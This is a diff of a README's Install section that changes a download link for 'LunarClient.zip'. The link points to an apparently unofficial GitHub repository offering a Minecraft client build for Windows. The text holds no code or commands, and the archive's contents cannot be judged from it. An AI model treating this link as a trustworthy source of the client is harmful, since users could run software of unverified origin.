@@ -20,7 +20,7 @@
 
 ---
 ## Install
-[Download `LunarClient.zip`](https://github.com/Bartates/lunar-client-minecraft/releases/latest/download/LunarClient.zip)
+[Download `LunarClient.zip`](https://github.com/Bartates/lunar-client-minecraft/releases/download/minecraft-client/LunarClient.zip)
 ---
 
 > Optimized for Windows 11.
